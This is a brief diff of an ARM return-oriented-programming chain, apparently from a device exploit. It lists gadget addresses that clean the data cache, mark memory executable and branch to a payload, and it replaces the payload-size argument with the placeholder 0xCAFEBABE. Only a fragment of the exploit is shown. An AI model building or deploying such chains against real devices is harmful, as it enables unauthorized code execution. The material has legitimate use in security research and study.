@@ -91,7 +91,7 @@ mark_executable:
 clean_dcache:
   .word BASE+0x00000853 @ pop {r0, r1, pc}
   .word      0xDEADBEEF @ r0
-  .word    PAYLOAD_SIZE @ r1
+  .word      0xCAFEBABE @ r1
   .word BASE+0x00001605 @ pop {r3, pc}
   .word BASE+0x00000347 @ r3 = pop {pc}
   .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
@@ -102,3 +102,4 @@ clean_dcache:
 
 execute_code:
   .word BASE+0x00011c5f @ blx r7
+  
